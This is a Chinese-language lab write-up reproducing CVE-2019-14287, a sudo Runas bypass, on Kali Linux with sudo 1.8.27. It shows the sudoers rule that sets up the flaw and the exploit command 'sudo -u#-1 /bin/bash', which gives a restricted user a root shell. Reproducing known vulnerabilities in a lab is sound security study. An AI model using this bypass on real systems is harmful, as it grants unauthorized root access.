一、漏洞描述

2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞的补丁修复。

此漏洞编号是CVE-2019-14287，当sudo配置为允许用户以任意方式运行命令时用户通过Runas规范中的ALL关键字，可以通过指定用户ID
-1或4294967295以root用户身份运行命令。

具有足够sudo权限的用户可以使用它来运行Runas规范明确禁止使用的root命令，以这种方式运行的命令的日志条目将列出目标用户为4294967295而不是root。

二、漏洞环境描述

操作系统| 内核版本| IP地址| Sudo版本  
---|---|---|---  
Kali Linux| 4.19.0-kali4-amd64| 192.168.37.131| 1.8.27  
  
三、漏洞复现过程

1、打开Kali Linux操作系统，查看sudo版本，确定sudo版本是否小于8.28，输入命令：sudo –V，验证结果如下图所示。

![1688630545_64a67511992a065e4ffc2.png!small](https://image.3001.net/images/20230706/1688630545_64a67511992a065e4ffc2.png!small)

2、编辑/etc/sudoers文件，增加对test账户设置的权限（这里的/bin/bash也可以换成其他命令）。添加的内容如下：

test ALL=(ALL,!root) /bin/bash

![1688632447_64a67c7f2169fdb8a8928.png!small](https://image.3001.net/images/20230706/1688632447_64a67c7f2169fdb8a8928.png!small)

输入内容如上图所示，将文件保存之后，退出。

由于当前系统下无“test”账户，所以在当前系统下新建账户“test”，新建账户命令为：useradd –m test，创建结果如下图所示：

![1688632486_64a67ca6073050c51701d.png!small](https://image.3001.net/images/20230706/1688632486_64a67ca6073050c51701d.png!small)

为用户“test”设置密码，创建密码命令为：passwd test，密码设置结果如下图所示：

![1688632497_64a67cb1a8e1b1dbe9788.png!small](https://image.3001.net/images/20230706/1688632497_64a67cb1a8e1b1dbe9788.png!small)

输入命令：su – test，切换用户到test账户中，结果如下图所示：

![1688632580_64a67d0417f2fbde71564.png!small](https://image.3001.net/images/20230706/1688632580_64a67d0417f2fbde71564.png!small)

如上图所示，当前用户已是test普通用户。

在当前用户“test”下对漏洞进行验证测试，测试命令为：sudo –u#-1 /bin/bash

同时输入命令：whoami，查看当前用户的权限，结果如下图所示：

![1688632593_64a67d11c295e36b09482.png!small](https://image.3001.net/images/20230706/1688632593_64a67d11c295e36b09482.png!small)

如上图所示，可以看到test用户的权限变成了root，说明漏洞利用成功！

